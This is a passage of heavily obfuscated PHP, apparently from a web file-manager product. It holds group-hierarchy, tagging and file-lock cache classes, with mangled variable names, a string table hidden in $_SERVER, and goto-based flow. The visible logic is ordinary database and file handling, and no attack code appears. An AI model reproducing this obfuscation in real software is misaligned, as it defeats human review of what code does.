count($ñ¨Êğ×ˆ[$ØµÇáş[455]]); $ñ¨Êğ×ˆ[$ØµÇáş[452]][$ØµÇáş[454]] = ceil($ñ¨Êğ×ˆ[$ØµÇáş[452]][$ØµÇáş[453]] / $ñ¨Êğ×ˆ[$ØµÇáş[452]][$ØµÇáş[449]]); } $this->_listDataApply($ñ¨Êğ×ˆ[$ØµÇáş[455]]); return $ñ¨Êğ×ˆ; } protected function groupChildrenAll($ûãêÔ´£) { $ƒ­ö½ŠÙ =& $_SERVER[áäÒ½¯Ç]; if (!$ûãêÔ´£) { return !1; } if (!is_array($ûãêÔ´£)) { $ûãêÔ´£ = array($ûãêÔ´£); } $—­®¼ÚÅ = $ûãêÔ´£; foreach ($ûãêÔ´£ as $ã Ä›Ã­) { $Ë÷ø€ù = $this->getInfoSimple($ã Ä›Ã­); $ççéÑâ¡ = array($ƒ­ö½ŠÙ[609] => array($ƒ­ö½ŠÙ[479], $Ë÷ø€ù[$ƒ­ö½ŠÙ[609]] . $ã Ä›Ã­ . $ƒ­ö½ŠÙ[641])); $š§ÚÙ‚ƒ = $this->field($ƒ­ö½ŠÙ[1444])->where($ççéÑâ¡)->select(); $—­®¼ÚÅ = array_merge($—­®¼ÚÅ, array_to_keyvalue($š§ÚÙ‚ƒ, $ƒ­ö½ŠÙ[12], $ƒ­ö½ŠÙ[1444])); } return array_unique($—­®¼ÚÅ); } private function _searchFromMeta($¼Æ–Œ®¿, $ÛŞ¥³¢Š, $Ãë§š², $ÌÖ¥‰±ê) { $óÀÕü—¿ =& $_SERVER[áäÒ½¯Ç]; $ÛŞ¥³¢Š = strtolower($ÛŞ¥³¢Š); $¡Óø¤ô¹ = array($óÀÕü—¿[95] => $¼Æ–Œ®¿, $óÀÕü—¿[460] => array($óÀÕü—¿[479], "\x25{$ÛŞ¥³¢Š}\45")); $¡Óø¤ô¹ = $this->parseWhereLike($¡Óø¤ô¹); if ($ÌÖ¥‰±ê) { $¡Óø¤ô¹[$óÀÕü—¿[1444]] = array($óÀÕü—¿[7], $ÌÖ¥‰±ê); } $â¯¤†•İ = Model($óÀÕü—¿[2234])->where($¡Óø¤ô¹)->limit($Ãë§š²)->select(); if (!$â¯¤†•İ) { return array(); } $â¯¤†•İ = array_to_keyvalue($â¯¤†•İ, $óÀÕü—¿[12], $óÀÕü—¿[1444]); $§†í¹“© = $this->where(array($óÀÕü—¿[2218] => array($óÀÕü—¿[7], $â¯¤†•İ)))->select(); if (!$§†í¹“©) { return array(); } return $§†í¹“©; } protected function _listDataApplyItem($¨¸óÃŒ¥) { $¡¶ÍáŒ’ = array($¨¸óÃŒ¥); $this->_listDataApply($¡¶ÍáŒ’); return $¡¶ÍáŒ’[0]; } protected function _listDataApply(&$å‚¬ıä„) { $ËñõıÁ =& $_SERVER[áäÒ½¯Ç]; if (!$å‚¬ıä„) { return; } $š²ó£ = array_to_keyvalue($å‚¬ıä„, $ËñõıÁ[12], $ËñõıÁ[1444]); $this->_listAppendChildren($å‚¬ıä„); $this->_listAppendChildrenMember($å‚¬ıä„); $this->_listAppendMeta($å‚¬ıä„, $š²ó£); $this->_listAppendParent($å‚¬ıä„); $this->_listAppendSourceRoot($å‚¬ıä„, $š²ó£); } private function _listAppendChildren(&$ñ•¦¤ğŸ) { $“ú¢  … =& $_SERVER[áäÒ½¯Ç]; $§ÙÄØ«é = array_to_keyvalue($ñ•¦¤ğŸ, $“ú¢  …[12], $“ú¢  …[1444]); $íê–ï·÷ = array($“ú¢  …[191] => array($“ú¢  …[7], $§ÙÄØ«é)); $èæ¢ÃíÖ = array($“ú¢  …[191], $“ú¢  …[2235] => $“ú¢  …[590]); $ÄÍŒ¢ = $this->field($èæ¢ÃíÖ)->where($íê–ï·÷)->group($“ú¢  …[191])->select(); $û·Ç®ï© = array_to_keyvalue($ÄÍŒ¢, $“ú¢  …[191], $“ú¢  …[590]); foreach ($ñ•¦¤ğŸ as &$§Â˜ëâ‚) { $ÁÍé¹€ = $§Â˜ëâ‚[$“ú¢  …[1444]]; $§Â˜ëâ‚[$“ú¢  …[2236]] = isset($û·Ç®ï©[$ÁÍé¹€]) ? intval($û·Ç®ï©[$ÁÍé¹€]) : !1; } unset($§Â˜ëâ‚); } private function _listAppendChildrenMember(&$ßÓÆ¢ãÄ) { $ú¡½¡Ä =& $_SERVER[áäÒ½¯Ç]; $¹ËÚ’· = array_to_keyvalue($ßÓÆ¢ãÄ, $ú¡½¡Ä[12], $ú¡½¡Ä[1444]); $åÖ…ë¯ = array($ú¡½¡Ä[1444] => array($ú¡½¡Ä[7], $¹ËÚ’·)); $í“ïä÷Ø = array($ú¡½¡Ä[1444], $ú¡½¡Ä[2235] => $ú¡½¡Ä[590]); $‡Ç‚ˆÖ = Model($ú¡½¡Ä[2225])->field($í“ïä÷Ø)->where($åÖ…ë¯)->group($ú¡½¡Ä[1444])->select(); $›Ì‹ÕëÊ = array_to_keyvalue($‡Ç‚ˆÖ, $ú¡½¡Ä[1444], $ú¡½¡Ä[590]); foreach ($ßÓÆ¢ãÄ as &$—»Áğ) { $îºª¡¶õ = $—»Áğ[$ú¡½¡Ä[1444]]; $—»Áğ[$ú¡½¡Ä[2237]] = isset($›Ì‹ÕëÊ[$îºª¡¶õ]) ? intval($›Ì‹ÕëÊ[$îºª¡¶õ]) : !1; } unset($—»Áğ); } private function _listAppendMeta(&$£¹Ş«ÜÜ, $óÁ°ı) { $÷°²¾Æ =& $_SERVER[áäÒ½¯Ç]; $²˜˜Á¢º = array($÷°²¾Æ[1444] => array($÷°²¾Æ[7], $óÁ°ı)); $Â¶­„üÚ = Model($÷°²¾Æ[2224])->where($²˜˜Á¢º)->select(); $Â¶­„üÚ = array_to_keyvalue_group($Â¶­„üÚ, $÷°²¾Æ[1444]); foreach ($Â¶­„üÚ as &$¯ì¼ŞÜü) { $¯ì¼ŞÜü = array_to_keyvalue($¯ì¼ŞÜü, $÷°²¾Æ[95], $÷°²¾Æ[460]); } unset($¯ì¼ŞÜü); foreach ($£¹Ş«ÜÜ as &$ª…‚Á¨µ) { $ª…‚Á¨µ[$÷°²¾Æ[560]] = array(); if (isset($Â¶­„üÚ[$ª…‚Á¨µ[$÷°²¾Æ[1444]]])) { $ª…‚Á¨µ[$÷°²¾Æ[560]] = $Â¶­„üÚ[$ª…‚Á¨µ[$÷°²¾Æ[1444]]]; } } unset($ª…‚Á¨µ); } protected function parentLevelArray($Œ—ª¾–²) { $ÂãÆ«ãê =& $_SERVER[áäÒ½¯Ç]; $Œ—ª¾–² = explode($ÂãÆ«ãê[50], trim($Œ—ª¾–², $ÂãÆ«ãê[50])); $Œ—ª¾–² = array_remove_value($Œ—ª¾–², $ÂãÆ«ãê[239]); return $Œ—ª¾–²; } protected function parentInGroup($ºîóÔîô, $»Ó±¡²á) { $†€¸È°š =& $_SERVER[áäÒ½¯Ç]; $ùÀÜ–¾Ù = $this->getInfoSimple($ºîóÔîô); if (!$ùÀÜ–¾Ù) { return !0; } $Æñ†‚æ = $this->parentLevelArray($ùÀÜ–¾Ù[$†€¸È°š[609]]); $Æñ†‚æ[] = $ºîóÔîô; foreach ($Æñ†‚æ as $ºîóÔîô) { if (in_array($ºîóÔîô . $†€¸È°š[12], $»Ó±¡²á)) { return !0; } } return !1; } private function _listAppendParent(&$ôÅ—ˆ) { $Ï±ã¨Áç =& $_SERVER[áäÒ½¯Ç]; $‹€Ù°Œˆ = array(); foreach ($ôÅ—ˆ as &$‚Ò¡Áø¬) { $‹€Ù°Œˆ[$‚Ò¡Áø¬[$Ï±ã¨Áç[1444]]] = $‚Ò¡Áø¬[$Ï±ã¨Áç[32]]; $éçì•„ = $this->parentLevelArray($‚Ò¡Áø¬[$Ï±ã¨Áç[609]]); foreach ($éçì•„ as $Ì’·ô) { if (!isset($‹€Ù°Œˆ[$Ì’·ô])) { $‹€Ù°Œˆ[$Ì’·ô] = 0; } } } unset($‚Ò¡Áø¬); foreach ($‹€Ù°Œˆ as $™í°ãÜü => $®¯ÂÉø) { if ($®¯ÂÉø) { continue; } $äØ¨¼À = $this->getInfoSimple($™í°ãÜü); $‹€Ù°Œˆ[$™í°ãÜü] = $äØ¨¼À[$Ï±ã¨Áç[32]]; } $¤åùÕñ  = $GLOBALS[$Ï±ã¨Áç[6]][$Ï±ã¨Áç[92]][$Ï±ã¨Áç[2238]]; if (KodUser::isRoot()) { $¤åùÕñ  = !1; } foreach ($ôÅ—ˆ as &$‚Ò¡Áø¬) { $éçì•„ = $this->parentLevelArray($‚Ò¡Áø¬[$Ï±ã¨Áç[609]]); $ò£ÓóŒ = $Ï±ã¨Áç[12]; foreach ($éçì•„ as $™í°ãÜü => $Ì’·ô) { if ($¤åùÕñ  && $™í°ãÜü == 0) { continue; } $ò£ÓóŒ .= $‹€Ù°Œˆ[$Ì’·ô] . $Ï±ã¨Áç[8]; } if ($éçì•„) { $ò£ÓóŒ .= $‚Ò¡Áø¬[$Ï±ã¨Áç[32]]; } $‚Ò¡Áø¬[$Ï±ã¨Áç[614]] = str_replace($Ï±ã¨Áç[265], $Ï±ã¨Áç[8], $ò£ÓóŒ); } unset($‚Ò¡Áø¬); } private function _listAppendSourceRoot(&$õÂ‘Ğëã, $…¨ Ú‘) { $µ¬ß”Õ =& $_SERVER[áäÒ½¯Ç]; $Š¡Ä¯˜ = Model($µ¬ß”Õ[935])->listSourceRoot(SourceModel::TYPE_GROUP, $…¨ Ú‘); $Š¡Ä¯˜ = array_to_keyvalue($Š¡Ä¯˜, $µ¬ß”Õ[594]); $Š¡Ä¯˜ = array_remove_key($Š¡Ä¯˜, $µ¬ß”Õ[594]); foreach ($õÂ‘Ğëã as &$Ü‚Òå´) { $Ü‚Òå´[$µ¬ß”Õ[90]] = $Š¡Ä¯˜[$Ü‚Òå´[$µ¬ß”Õ[1444]]] ? $Š¡Ä¯˜[$Ü‚Òå´[$µ¬ß”Õ[1444]]] : array(); } unset($Ü‚Òå´); } protected function groupMerge($Ö‰×ÄúÉ) { $Ö‰×ÄúÉ = array_values(array_unique($Ö‰×ÄúÉ)); $õ’‚ÆıÔ = array(); for ($Ñöæ“¿ = 0; $Ñöæ“¿ < count($Ö‰×ÄúÉ); $Ñöæ“¿++) { $ÀÜ¨Øš° = !1; for ($Áú·¦Ø­ = 0; $Áú·¦Ø­ < count($Ö‰×ÄúÉ); $Áú·¦Ø­++) { if ($Ñöæ“¿ == $Áú·¦Ø­) { continue; } if ($this->isParentOf($Ö‰×ÄúÉ[$Áú·¦Ø­], $Ö‰×ÄúÉ[$Ñöæ“¿])) { $ÀÜ¨Øš° = !0; break; } } if (!$ÀÜ¨Øš°) { $õ’‚ÆıÔ[] = $Ö‰×ÄúÉ[$Ñöæ“¿]; } } return $õ’‚ÆıÔ; } protected function isParentOf($‰õ¹›¬€, $âÕ÷€ú) { $Ï™™•š =& $_SERVER[áäÒ½¯Ç]; if (!$‰õ¹›¬€ || !$âÕ÷€ú || $‰õ¹›¬€ == $âÕ÷€ú) { return !1; } $Åç½ï„œ = $this->getInfoSimple($‰õ¹›¬€); $±“Ãê¢ = $this->getInfoSimple($âÕ÷€ú); $³³×Éşö = $Åç½ï„œ[$Ï™™•š[609]] . $‰õ¹›¬€ . $Ï™™•š[50]; if (substr($±“Ãê¢[$Ï™™•š[609]], 0, strlen($³³×Éşö)) == $³³×Éşö) { return !0; } return !1; } public function groupShowRoot($ŞğáµÓç, $İ¨‚³õê = false) { $‚ªşâÎÕ =& $_SERVER[áäÒ½¯Ç]; $«†ã­å = $this->getInfo($ŞğáµÓç); if (!$«†ã­å) { return array(); } $Àß‡õü£ = $this->parentLevelArray($«†ã­å[$‚ªşâÎÕ[609]]); $•â«‰™â = array($ŞğáµÓç); if (count($Àß‡õü£) == 0) { return $•â«‰™â; } if ($İ¨‚³õê && count($Àß‡õü£) == 1) { return $•â«‰™â; } if (!$«†ã­å[$‚ªşâÎÕ[560]] || !isset($«†ã­å[$‚ªşâÎÕ[560]][$‚ªşâÎÕ[2219]]) || $«†ã­å[$‚ªşâÎÕ[560]][$‚ªşâÎÕ[2219]] == $‚ªşâÎÕ[881]) { return $this->groupShowRoot($Àß‡õü£[count($Àß‡õü£) - 1], $İ¨‚³õê); } if ($«†ã­å[$‚ªşâÎÕ[560]][$‚ªşâÎÕ[2219]] == $‚ªşâÎÕ[442]) { $¢‚å˜çì = explode($‚ªşâÎÕ[50], $«†ã­å[$‚ªşâÎÕ[560]][$‚ªşâÎÕ[2220]]); if ($¢‚å˜çì) { $•â«‰™â = array_merge($•â«‰™â, $¢‚å˜çì); } } return $•â«‰™â; } protected function resetParentLevel() { $É€ıû°º =& $_SERVER[áäÒ½¯Ç]; $åÀÊ¡øµ = $É€ıû°º[1444]; $†äÚŸ = $this->select(); $†äÚŸ = array_to_keyvalue($†äÚŸ, $åÀÊ¡øµ); foreach ($†äÚŸ as $˜Œ¢ëå) { $–‡ÛÜÕÅ = $˜Œ¢ëå; $÷ÙúĞ•À = array(); while ($–‡ÛÜÕÅ[$É€ıû°º[191]] != 0) { $÷ÙúĞ•À[] = $–‡ÛÜÕÅ[$É€ıû°º[191]]; $–‡ÛÜÕÅ = $†äÚŸ[$–‡ÛÜÕÅ[$É€ıû°º[191]]]; } $÷ÙúĞ•À[] = 0; $÷ÙúĞ•À = $É€ıû°º[50] . implode($É€ıû°º[50], array_reverse($÷ÙúĞ•À)) . $É€ıû°º[50]; $this->setNamePinyin($˜Œ¢ëå[$åÀÊ¡øµ], $˜Œ¢ëå[$É€ıû°º[32]]); $this->where(array($åÀÊ¡øµ => $˜Œ¢ëå[$åÀÊ¡øµ]))->save(array($É€ıû°º[680] => $÷ÙúĞ•À)); } return $†äÚŸ; } public function groupNameAuto($Öß²½²Ó, $¿˜‚ÂïÑ) { $×æ›Îç¦ =& $_SERVER[áäÒ½¯Ç]; $éÅÖÉ³  = $this->where(array($×æ›Îç¦[497] => $Öß²½²Ó))->getField($×æ›Îç¦[32], !0); if (!$éÅÖÉ³  || !in_array($¿˜‚ÂïÑ, $éÅÖÉ³ )) { return $¿˜‚ÂïÑ; } for ($”¢ÔŞ»… = 1; $”¢ÔŞ»… <= count($éÅÖÉ³ ) + 1; $”¢ÔŞ»…++) { $ş˜İ—Å¿ = $¿˜‚ÂïÑ . "\x28{$”¢ÔŞ»…}\x29"; if (!in_array($ş˜İ—Å¿, $éÅÖÉ³ )) { return $ş˜İ—Å¿; } } } public function groupSwitch($Û›ú¦ƒ€, $»Ôí¯ÙÍ) { $„Ç¾Ø”Ø =& $_SERVER[áäÒ½¯Ç]; $°ÌØ¯¶¿ = array($„Ç¾Ø”Ø[1444] => array($„Ç¾Ø”Ø[7], array($Û›ú¦ƒ€, $»Ôí¯ÙÍ))); $Ú•’‰°« = $this->where($°ÌØ¯¶¿)->select(); $Ú•’‰°« = array_to_keyvalue($Ú•’‰°«, $„Ç¾Ø”Ø[1444]); $¹ø¶ïƒÙ = _get($Ú•’‰°«, $Û›ú¦ƒ€); $ÖÕá§¾à = _get($Ú•’‰°«, $»Ôí¯ÙÍ); if (!$¹ø¶ïƒÙ || !$ÖÕá§¾à || $¹ø¶ïƒÙ[$„Ç¾Ø”Ø[191]] == 0) { return !1; } if ($¹ø¶ïƒÙ[$„Ç¾Ø”Ø[1444]] == $ÖÕá§¾à[$„Ç¾Ø”Ø[1444]]) { return !1; } if (strpos($ÖÕá§¾à[$„Ç¾Ø”Ø[609]], $¹ø¶ïƒÙ[$„Ç¾Ø”Ø[609]] . $¹ø¶ïƒÙ[$„Ç¾Ø”Ø[1444]] . $„Ç¾Ø”Ø[50]) === 0) { return !1; } $°ÌØ¯¶¿ = array($„Ç¾Ø”Ø[1444] => $Û›ú¦ƒ€); $ÂÃ™¤­¿ = Model($„Ç¾Ø”Ø[2225])->where($°ÌØ¯¶¿)->select(); if (!$ÂÃ™¤­¿) { $ÂÃ™¤­¿ = array(); } foreach ($ÂÃ™¤­¿ as $§î¢â‡) { $ô©©ìà = $§î¢â‡[$„Ç¾Ø”Ø[1542]]; $°ÌØ¯¶¿ = array($„Ç¾Ø”Ø[1542] => $ô©©ìà, $„Ç¾Ø”Ø[1444] => $»Ôí¯ÙÍ); $¸’‡µ‡ş = Model($„Ç¾Ø”Ø[2225])->where($°ÌØ¯¶¿)->find(); if (!$¸’‡µ‡ş) { $äŠÙ³ù° = array($»Ôí¯ÙÍ => $§î¢â‡[$„Ç¾Ø”Ø[1589]]); Model($„Ç¾Ø”Ø[622])->userGroupAdd($ô©©ìà, $äŠÙ³ù°); } Model($„Ç¾Ø”Ø[622])->userGroupRemove($ô©©ìà, $Û›ú¦ƒ€); } $°ÌØ¯¶¿ = array($„Ç¾Ø”Ø[189] => 2, $„Ç¾Ø”Ø[191] => 0, $„Ç¾Ø”Ø[505] => 1, $„Ç¾Ø”Ø[594] => array($„Ç¾Ø”Ø[7], array($Û›ú¦ƒ€, $»Ôí¯ÙÍ))); $­ú£è„à = Model($„Ç¾Ø”Ø[935])->where($°ÌØ¯¶¿)->field($„Ç¾Ø”Ø[2239])->select(); $­ú£è„à = array_to_keyvalue($­ú£è„à, $„Ç¾Ø”Ø[594], $„Ç¾Ø”Ø[192]); $Æ˜ÍÊó¸ = !empty($­ú£è„à[$Û›ú¦ƒ€]) ? $­ú£è„à[$Û›ú¦ƒ€] : !1; if ($Æ˜ÍÊó¸) { if (!$­ú£è„à[$»Ôí¯ÙÍ]) { $­ú£è„à[$»Ôí¯ÙÍ] = Model($„Ç¾Ø”Ø[935])->groupRootAdd($»Ôí¯ÙÍ); } $®ÛëĞú© = $­ú£è„à[$»Ôí¯ÙÍ]; $°ÌØ¯¶¿ = array($„Ç¾Ø”Ø[191] => $Æ˜ÍÊó¸); $­ú£è„à = Model($„Ç¾Ø”Ø[935])->where($°ÌØ¯¶¿)->field($„Ç¾Ø”Ø[2240])->select(); if (!$­ú£è„à) { $­ú£è„à = array(); } Model($„Ç¾Ø”Ø[935])->moveClearAuth = !1; foreach ($­ú£è„à as $êé’¿í£) { $“¯ß”•¦ = $êé’¿í£[$„Ç¾Ø”Ø[505]] == $„Ç¾Ø”Ø[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($„Ç¾Ø”Ø[935])->move($êé’¿í£[$„Ç¾Ø”Ø[192]], $®ÛëĞú©, $“¯ß”•¦); } Model($„Ç¾Ø”Ø[935])->moveClearAuth = !0; $°ÌØ¯¶¿ = array($„Ç¾Ø”Ø[189] => 2, $„Ç¾Ø”Ø[594] => $Û›ú¦ƒ€); $³ˆÜÆ±Ì = array($„Ç¾Ø”Ø[594] => $»Ôí¯ÙÍ); Model($„Ç¾Ø”Ø[2241])->where($°ÌØ¯¶¿)->save($³ˆÜÆ±Ì); Model($„Ç¾Ø”Ø[2242])->where($°ÌØ¯¶¿)->save($³ˆÜÆ±Ì); } $this->_changeChildLevel($Ú•’‰°«[$Û›ú¦ƒ€], $Ú•’‰°«[$»Ôí¯ÙÍ], !0); $this->where(array($„Ç¾Ø”Ø[191] => $Û›ú¦ƒ€))->save(array($„Ç¾Ø”Ø[191] => $»Ôí¯ÙÍ)); $this->_clearChildrenCache($Ú•’‰°«[$»Ôí¯ÙÍ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($Ê²¢ƒöØ) { $ìËç™ª– =& $_SERVER[áäÒ½¯Ç]; return array($ìËç™ª–[2243] => array($Ê²¢ƒöØ[0], $ìËç™ª–[2244]), $ìËç™ª–[2245] => array($Ê²¢ƒöØ[0], $ìËç™ª–[2246])); } protected function ___get($½Öà©Å¿) { $‚À§³Ú =& $_SERVER[áäÒ½¯Ç]; $úÚüò­Ê = Model($‚À§³Ú[610])->metaGet($½Öà©Å¿, $‚À§³Ú[2247]); $¦®‹¦·î = json_decode($úÚüò­Ê, !0); return $¦®‹¦·î ? $¦®‹¦·î : array($‚À§³Ú[2248] => $‚À§³Ú[91], $‚À§³Ú[455] => array()); } protected function ___listData($ˆ‚¶ÅœØ) { $ªå©Š¨Ö =& $_SERVER[áäÒ½¯Ç]; $Í’Ùà¿÷ = array($ªå©Š¨Ö[1918] => 0, $ªå©Š¨Ö[578] => array($ªå©Š¨Ö[2249], 0), $ªå©Š¨Ö[516] => $ªå©Š¨Ö[1440] . $ˆ‚¶ÅœØ); $ì„æÉî¨ = $ªå©Š¨Ö[2250]; $ËÇØ–‡– = $this->field($ì„æÉî¨)->where($Í’Ùà¿÷)->order($ªå©Š¨Ö[2251])->select(); return $ËÇØ–‡– ? $ËÇØ–‡– : array(); } protected function set($ë£—€›, $ÔüŠ†ÊÇ) { $µÒ ˜ÊÁ =& $_SERVER[áäÒ½¯Ç]; $ÔüŠ†ÊÇ = $ÔüŠ†ÊÇ ? $ÔüŠ†ÊÇ : array($µÒ ˜ÊÁ[2248] => $µÒ ˜ÊÁ[91], $µÒ ˜ÊÁ[455] => array()); return Model($µÒ ˜ÊÁ[610])->metaSet($ë£—€›, $µÒ ˜ÊÁ[2247], json_encode($ÔüŠ†ÊÇ)); } protected function getByTagID($Áá»Ã»Š, $÷¶Ş¶‘ı) { $ò«”–Èå =& $_SERVER[áäÒ½¯Ç]; if (!$Áá»Ã»Š || !$÷¶Ş¶‘ı) { return !1; } if (!Model($ò«”–Èå[610])->getInfoSimple($Áá»Ã»Š)) { return !1; } $œ¡×“Ñ = $this->get($Áá»Ã»Š); if (!$œ¡×“Ñ || !isset($œ¡×“Ñ[$ò«”–Èå[455]])) { return !1; } $‘ƒ“˜³§ = array_find_by_field($œ¡×“Ñ[$ò«”–Èå[455]], $ò«”–Èå[492], $÷¶Ş¶‘ı); return is_array($‘ƒ“˜³§) ? $‘ƒ“˜³§ : !1; } public function listSource($ÎÊ·ËÆù, $Ù’³Âà¸) { $Ê×—åıª =& $_SERVER[áäÒ½¯Ç]; if ($Ù’³Âà¸ && !is_array($Ù’³Âà¸)) { $Ù’³Âà¸ = array($Ù’³Âà¸); } $‹ñÖÈñš = $this->get($ÎÊ·ËÆù); $…æ¼Œø¯ = array_to_keyvalue($‹ñÖÈñš[$Ê×—åıª[455]], $Ê×—åıª[492]); $ˆâÑüÛû = array_to_keyvalue($‹ñÖÈñš[$Ê×—åıª[603]], $Ê×—åıª[492]); $ÏØ®Ïı = $this->listData($ÎÊ·ËÆù); $ôÛ«º©‘ = array(); foreach ($Ù’³Âà¸ as $¼ù²‰äç) { $£Ÿ‚Ï½Œ = $…æ¼Œø¯[$¼ù²‰äç]; $¨Ê‡´¿ = _get($£Ÿ‚Ï½Œ, $Ê×—åıª[603]); if (!$£Ÿ‚Ï½Œ || !$¨Ê‡´¿ || !$ˆâÑüÛû[$¨Ê‡´¿]) { continue; } if (!$ôÛ«º©‘[$¨Ê‡´¿]) { $ôÛ«º©‘[$¨Ê‡´¿] = array(); } $ôÛ«º©‘[$¨Ê‡´¿][] = $¼ù²‰äç; } $ã¸á÷« = array(); $€ÁÍİĞ— = array(); foreach ($ÏØ®Ïı as $°êÈÇß†) { $Â¬ôÖíí = $°êÈÇß†[$Ê×—åıª[87]]; $£Ÿ‚Ï½Œ = $…æ¼Œø¯[$°êÈÇß†[$Ê×—åıª[520]]]; $¨Ê‡´¿ = _get($£Ÿ‚Ï½Œ, $Ê×—åıª[603]); if (!$£Ÿ‚Ï½Œ || !$¨Ê‡´¿ || !$ôÛ«º©‘[$¨Ê‡´¿] || !$Â¬ôÖíí) { continue; } if (!in_array($°êÈÇß†[$Ê×—åıª[520]], $ôÛ«º©‘[$¨Ê‡´¿])) { continue; } if (!$ã¸á÷«[$Â¬ôÖíí]) { $ã¸á÷«[$Â¬ôÖíí] = array(); } $ã¸á÷«[$Â¬ôÖíí][] = $¨Ê‡´¿; } foreach ($ã¸á÷« as $Â¬ôÖíí => $”°âÃ÷ö) { if (count($”°âÃ÷ö) != count($ôÛ«º©‘)) { continue; } $€ÁÍİĞ—[] = $Â¬ôÖíí; } if (!$€ÁÍİĞ—) { return array(); } $ÀÓşæÜä = array($Ê×—åıª[511] => array($Ê×—åıª[512], $€ÁÍİĞ—), $Ê×—åıª[594] => $ÎÊ·ËÆù, $Ê×—åıª[189] => SourceModel::TYPE_GROUP); $ç×Ÿïã› = Model($Ê×—åıª[1482])->listSource($ÀÓşæÜä); if (!$ç×Ÿïã› || count($€ÁÍİĞ—) == $ç×Ÿïã›[$Ê×—åıª[452]][$Ê×—åıª[453]]) { return $ç×Ÿïã›; } $ÚÔ§Á = array(); $ÚÂé¥ñí = array_to_keyvalue($ç×Ÿïã›[$Ê×—åıª[85]], $Ê×—åıª[12], $Ê×—åıª[192]); $Ò†å÷• = array_to_keyvalue($ç×Ÿïã›[$Ê×—åıª[86]], $Ê×—åıª[12], $Ê×—åıª[192]); $ğÌµ”ú = array_merge($Ò†å÷•, $ÚÂé¥ñí); foreach ($€ÁÍİĞ— as $Â¬ôÖíí) { if (!in_array($Â¬ôÖíí, $ğÌµ”ú)) { $ÚÔ§Á[] = $Â¬ôÖíí; } } if ($ÚÔ§Á) { $this->removeBySource($ÎÊ·ËÆù, $ÚÔ§Á); } return $ç×Ÿïã›; } protected function addToTag($Ùß•ø¤Ú, $×¿‚‘Ì, $”Èï¬ñË) { $Šß°ÑŒ =& $_SERVER[áäÒ½¯Ç]; if (!$this->getByTagID($Ùß•ø¤Ú, $”Èï¬ñË) || !$×¿‚‘Ì) { return !1; } if (!Model($Šß°ÑŒ[935])->pathInfo($×¿‚‘Ì)) { return !1; } $Îõ¬êŠú = array($Šß°ÑŒ[1918] => 0, $Šß°ÑŒ[578] => $”Èï¬ñË, $Šß°ÑŒ[515] => $×¿‚‘Ì, $Šß°ÑŒ[516] => $Šß°ÑŒ[2252] . $Ùß•ø¤Ú, $Šß°ÑŒ[514] => $Šß°ÑŒ[12], $Šß°ÑŒ[2137] => 0); if ($this->where($Îõ¬êŠú)->find()) { return !1; } return $this->add($Îõ¬êŠú); } protected function removeFromTag($®ıÅ•, $‹ƒÕ­°¶, $šãƒƒ¢Ï) { $Ğ±îÈ¡’ =& $_SERVER[áäÒ½¯Ç]; if (!$this->getByTagID($®ıÅ•, $šãƒƒ¢Ï) || !$‹ƒÕ­°¶) { return !1; } if (is_array($‹ƒÕ­°¶)) { $‹ƒÕ­°¶ = array($Ğ±îÈ¡’[7], $‹ƒÕ­°¶); } $ºóŒ½ô¤ = array($Ğ±îÈ¡’[1918] => 0, $Ğ±îÈ¡’[578] => $šãƒƒ¢Ï, $Ğ±îÈ¡’[516] => $Ğ±îÈ¡’[2252] . $®ıÅ•, $Ğ±îÈ¡’[515] => $‹ƒÕ­°¶); return $this->where($ºóŒ½ô¤)->delete(); } protected function removeByTag($Ê¯êÉïÅ, $Š ÀÏ†ç) { $á¥¯Ÿñ =& $_SERVER[áäÒ½¯Ç]; if (!$this->getByTagID($Ê¯êÉïÅ, $Š ÀÏ†ç)) { return !1; } $¬õ¦¸ÙÀ = array($á¥¯Ÿñ[1918] => 0, $á¥¯Ÿñ[578] => $Š ÀÏ†ç, $á¥¯Ÿñ[516] => $á¥¯Ÿñ[2252] . $Ê¯êÉïÅ); return $this->where($¬õ¦¸ÙÀ)->delete(); } protected function removeBySource($ŞÂ¥ïÀŒ, $©æÌ‚Ìê) { $Á™Î½úë =& $_SERVER[áäÒ½¯Ç]; if (!$ŞÂ¥ïÀŒ || !$©æÌ‚Ìê) { return !1; } if (is_array($©æÌ‚Ìê)) { $©æÌ‚Ìê = array($Á™Î½úë[7], $©æÌ‚Ìê); } $İ¨êğÃÒ = array($Á™Î½úë[1918] => 0, $Á™Î½úë[515] => $©æÌ‚Ìê, $Á™Î½úë[578] => array($Á™Î½úë[1130], 0), $Á™Î½úë[516] => $Á™Î½úë[2252] . $ŞÂ¥ïÀŒ); return $this->where($İ¨êğÃÒ)->delete(); } } goto eØ…Ô‹Ò‹; Döˆ÷¯ñÚ¶: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $à„Õ×— =& $_SERVER[áäÒ½¯Ç]; $òå¶Ìå = $GLOBALS[$à„Õ×—[6]][$à„Õ×—[434]]; self::$cachePath = $òå¶Ìå[$à„Õ×—[241]][$à„Õ×—[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($›Õ…ˆï, $¨½­‘úÀ = 0) { $é«§ÛøÀ =& $_SERVER[áäÒ½¯Ç]; $Ñ÷ê‡À  = microtime(!0); $¥çæÙ = $Ñ÷ê‡À  + $¨½­‘úÀ + 0.0001; $úÊåŒˆé = rtrim(self::$cachePath, $é«§ÛøÀ[8]) . $é«§ÛøÀ[978] . md5($›Õ…ˆï) . $é«§ÛøÀ[975]; if (file_exists($úÊåŒˆé) && filemtime($úÊåŒˆé) && filemtime($úÊåŒˆé) < time() - 10) { @unlink($úÊåŒˆé); } do { if (file_exists($úÊåŒˆé)) { cacheLockWait(); continue; } $ûÃó€· = fopen($úÊåŒˆé, $é«§ÛøÀ[979]); if (!$ûÃó€·) { return !1; } $©ü“—«œ = flock($ûÃó€·, LOCK_EX | LOCK_NB); self::$caches[$›Õ…ˆï] = array($é«§ÛøÀ[980] => $ûÃó€·, $é«§ÛøÀ[241] => $úÊåŒˆé); fwrite($ûÃó€·, $¥çæÙ); clearstatcache(); if ($ûÃó€· && $©ü“—«œ) { return !0; } cacheLockWait(); } while (microtime(!0) < $¥çæÙ); $this->unlock($›Õ…ˆï); return !1; } public function lockGet($‹Ëñİ‚) { $éÙê×ğÆ =& $_SERVER[áäÒ½¯Ç]; $Í¸İ¶‚ = rtrim(self::$cachePath, $éÙê×ğÆ[8]) . $éÙê×ğÆ[978] . md5($‹Ëñİ‚) . 